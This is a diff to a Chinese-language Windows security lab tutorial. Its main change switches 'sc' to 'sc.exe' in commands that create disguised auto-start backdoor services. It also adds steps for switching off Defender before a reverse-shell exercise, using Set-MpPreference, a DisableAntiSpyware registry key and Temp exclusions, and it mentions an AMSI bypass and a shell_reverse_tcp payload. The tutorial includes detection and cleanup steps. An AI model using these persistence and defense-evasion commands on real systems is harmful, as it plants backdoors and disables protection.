@@ -143,14 +143,14 @@ Windows系统中常见的后门类型：
 **创建服务后门的命令**：
 
 ```powershell
-# 创建伪装服务
-sc create "WindowsUpdateHelper" binpath="C:\Windows\Temp\malware.exe" start=auto
-sc description "WindowsUpdateHelper" "Provides Windows Update support services"
-sc start "WindowsUpdateHelper"
+# 创建伪装服务（PowerShell中必须用sc.exe，因为sc是Set-Content的别名）
+sc.exe create "WindowsUpdateHelper" binpath="C:\Windows\Temp\malware.exe" start=auto
+sc.exe description "WindowsUpdateHelper" "Provides Windows Update support services"
+sc.exe start "WindowsUpdateHelper"
 
 # 查看服务配置
-sc qc "WindowsUpdateHelper"
-sc query "WindowsUpdateHelper"
+sc.exe qc "WindowsUpdateHelper"
+sc.exe query "WindowsUpdateHelper"
 ```
 
 > 🔍 **检测线索**：通过 `sc query type=service state=all` 或 `Get-Service` 查看所有服务，重点关注启动类型为"自动"但名称/描述可疑、二进制路径指向Temp等非常规目录的服务。
@@ -341,6 +341,7 @@ app.exe 启动 → 搜索 userenv.dll
 > - Server 2025 默认启用 **VBS（基于虚拟化的安全）** 和增强版 Windows Defender，关闭实时防护需通过组策略：`gpedit.msc` → 计算机配置 → 管理模板 → Windows 组件 → Microsoft Defender 防病毒 → 实时保护 → 启用"关闭实时保护"策略
 > - 如果组策略无效，还需关闭"篡改防护"：Windows 安全中心 → 病毒和威胁防护 → 管理设置 → 关闭"篡改防护"（必须先关闭此项，组策略才能生效）
 > - Server 2025 的 PowerShell 5.1 仍支持 `Get-WmiObject`，但微软建议使用 `Get-CimInstance` 替代（功能等价，语法略有不同）
+> - **PowerShell 中 `sc` 是 `Set-Content` 的别名**，不是服务控制命令！在 PowerShell 中操作服务必须使用 `sc.exe create`、`sc.exe delete` 等完整路径。在 CMD 命令提示符中则可以直接使用 `sc`。
 
 ---
 
@@ -546,16 +547,16 @@ Set-Content -Path "C:\Windows\Temp\backdoor.exe" -Value "placeholder" -Encoding 
 **命令行方式**：
 
 ```powershell
-# 创建伪装的系统服务
-sc create "SystemDiagnostic" binpath="C:\Windows\Temp\backdoor.exe" start=auto displayname="System Diagnostic Service"
-sc description "SystemDiagnostic" "Monitors system health and performance metrics"
+# 创建伪装的系统服务（PowerShell中必须用sc.exe）
+sc.exe create "SystemDiagnostic" binpath="C:\Windows\Temp\backdoor.exe" start=auto displayname="System Diagnostic Service"
+sc.exe description "SystemDiagnostic" "Monitors system health and performance metrics"
 
 # 尝试启动服务（预期会报错1053，因为模拟程序未实现SCM接口，这是正常的）
-sc start "SystemDiagnostic"
+sc.exe start "SystemDiagnostic"
 
 # 查看服务配置详情（重点关注：即使服务未成功启动，后门配置已写入注册表）
-sc qc "SystemDiagnostic"
-sc query "SystemDiagnostic"
+sc.exe qc "SystemDiagnostic"
+sc.exe query "SystemDiagnostic"
 ```
 
 > ⚠️ **预期结果**：`sc qc` 会显示服务的 BINARY_PATH_NAME 指向 `C:\Windows\Temp\backdoor.exe`，START_TYPE 为 AUTO_START。`sc start` 可能报错1053（服务未及时响应），这不影响实验——关键是理解服务配置已被写入系统。
@@ -618,8 +619,8 @@ Get-WmiObject Win32_Service | ForEach-Object {
 
 ```powershell
 # 停止并删除恶意服务
-sc stop "SystemDiagnostic"
-sc delete "SystemDiagnostic"
+sc.exe stop "SystemDiagnostic"
+sc.exe delete "SystemDiagnostic"
 
 # 删除恶意文件
 Remove-Item "C:\Windows\Temp\backdoor.exe" -Force -ErrorAction SilentlyContinue
@@ -838,6 +839,24 @@ New-NetFirewallRule -DisplayName "WinRM Restrict" -Direction Inbound -Protocol T
 **原理**：反弹Shell（Reverse Shell）是攻击技术中的核心概念。与正向连接不同，反弹Shell由**目标主机主动连接攻击机**，能有效绕过目标主机的入站防火墙规则。
 
 > ⚠️ **Server 2025 兼容性说明**：Windows Server 2025 的 Defender 集成了增强版 AMSI（反恶意软件扫描接口）和智能应用控制，即使关闭实时防护，AMSI 仍可能拦截 PowerShell 类型的 Payload。建议实验时：（1）通过组策略彻底关闭 Defender（参见实验环境说明）；（2）优先使用 EXE 格式木马而非 PowerShell 脚本格式；（3）如仍被拦截，可在 Defender 排除项中添加 `C:\Windows\Temp\` 目录。
+>
+> ⚠️ **实测踩坑记录（Windows Server 2022 同样适用）**：
+> 1. **必须先关Defender再下载木马**：如果先下载再关Defender，文件会被立即删除（实时防护在文件落盘瞬间扫描）
+> 2. **`Set-MpPreference -DisableRealtimeMonitoring $true` 不够**：AMSI仍会在内存中拦截Meterpreter DLL，导致会话建立后秒断（"session opened → session closed. Reason: Died"）
+> 3. **正确的关闭顺序**：先在GUI中关闭"篡改防护" → 再通过组策略或命令彻底关闭Defender → 最后下载木马
+> 4. **彻底关闭Defender的命令**：
+> 
+> ```powershell
+> # 在靶机上以管理员身份执行（需先手动关闭"篡改防护"）
+> Set-MpPreference -DisableRealtimeMonitoring $true
+> Set-MpPreference -DisableIOAVProtection $true
+> Set-MpPreference -DisableScriptScanning $true
+> reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
+> # 关闭后再下载/执行木马
+> ```
+
+
+> 1. **如果Meterpreter会话仍秒断**：改用PowerShell反弹Shell（配合AMSI bypass），或使用`windows/x64/shell_reverse_tcp`（简单cmd shell，不加载Meterpreter DLL）
 
 ```
 正向连接（Forward Shell）：
@@ -1052,8 +1071,8 @@ schtasks /delete /tn "DiskCleanupTask" /f 2>$null
 schtasks /delete /tn "UserProfileSync" /f 2>$null
 
 # 3. 清除服务后门
-sc stop "SystemDiagnostic" 2>$null
-sc delete "SystemDiagnostic" 2>$null
+sc.exe stop "SystemDiagnostic" 2>$null
+sc.exe delete "SystemDiagnostic" 2>$null
 
 # 4. 恢复sethc.exe
 if (Test-Path "C:\Windows\System32\sethc.exe.bak") {
